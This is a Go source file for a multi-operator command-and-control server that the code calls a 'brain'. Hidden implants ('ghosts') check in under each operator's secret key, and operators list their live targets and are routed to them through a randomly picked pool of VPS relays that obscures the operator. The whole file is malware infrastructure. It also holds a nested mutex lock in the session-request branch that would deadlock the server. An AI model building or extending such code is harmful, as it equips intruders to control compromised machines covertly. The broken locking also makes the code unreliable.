package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

// --- DATA STRUCTURES ---

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"` // This is the Operator's Secret (X or Y)
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"` // Used by Relays to register
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	// SHARED RELAY POOL (Shared by all Operators)
	relayPool []string

	// SESSION TRACKING
	// Maps TargetID -> The specific Relay Port assigned for the current task
	activeSessions = make(map[string]string)

	// AUTH & TELEMETRY
	activeTargets = make(map[string]string) // TargetID -> OperatorKey
	lastSeen      = make(map[string]time.Time)

	// PORT GENERATOR (The "Room" assigner)
	portMutex sync.Mutex
	nextPort  = 5001

	mu sync.Mutex
)

func main() {
	rand.Seed(time.Now().UnixNano())
	ln, _ := net.Listen("tcp", ":8080")
	fmt.Println("==========================================")
	fmt.Println("   FEDERATED SHARED-RELAY BRAIN (v6)    ")
	fmt.Println("   Supporting Multiple Operators (X/Y)  ")
	fmt.Println("==========================================")

	for {
		conn, _ := ln.Accept()
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	var req AuthRequest
	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}

	id := strings.ToUpper(req.TargetID)
	mu.Lock()
	defer mu.Unlock()

	switch req.Type {
	case "middle":
		// A Relay joins the global pool (Available for X and Y)
		relayPool = append(relayPool, req.Listen)
		fmt.Printf("[GLOBAL] New Relay Added to Pool: %s\n", req.Listen)

	case "client_register":
		// Ghost checks in under a specific Operator's Key
		activeTargets[id] = req.Key
		lastSeen[id] = time.Now()
		fmt.Printf("[+] Node %s (Owner: %s) is Online\n", id, req.Key)

	case "cc_list":
		// Operator X asks for HIS ghosts; Operator Y asks for HERS
		t := make([]string, 0)
		for tid, ownerKey := range activeTargets {
			if ownerKey == req.Key && time.Since(lastSeen[tid]) < 60*time.Second {
				t = append(t, tid)
			}
		}
		json.NewEncoder(conn).Encode(t)

	case "cc_req":
		mu.Lock()
		if len(relayPool) == 0 {
			mu.Unlock()
			return
		}

		// 1. Pick a random VPS from the pool
		// relayPool contains strings like "1.2.3.4:5001", "5.6.7.8:5001"
		randomRelay := relayPool[rand.Intn(len(relayPool))]

		// 2. Assign this specific Relay to the Ghost's session
		activeSessions[id] = randomRelay
		mu.Unlock()

		// 3. Tell the TUI which VPS to connect to
		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: randomRelay})
		fmt.Printf("[>] Session Randomized: %s is using Relay %s\n", id, randomRelay)
	case "client_poll":
		if addr, exists := activeSessions[id]; exists {
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
			// DELETE the session so the ghost doesn't get
			// the same (potentially broken) route twice!
			delete(activeSessions, id)
		}
		lastSeen[id] = time.Now()
	}
}
